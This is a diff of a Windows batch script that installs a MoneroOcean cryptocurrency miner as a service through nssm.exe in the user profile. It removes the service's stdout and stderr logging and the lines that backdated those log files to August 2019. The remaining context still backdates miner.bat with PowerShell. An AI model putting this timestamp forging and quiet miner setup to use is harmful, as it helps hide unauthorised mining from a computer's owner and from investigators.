@@ -406,22 +406,10 @@ if errorlevel 1 (
 )
 
 
-echo > stderr
-echo > stdout
-
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\stderr').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\stderr').LastWriteTime=('3 August 2019 17:00:00')"
-
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\stdout').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\stdout').LastWriteTime=('3 August 2019 17:00:00')"
-
-
 
 
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\moneroocean"
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
-"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"
 
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').CreationTime=('3 August 2019 17:00:00')"
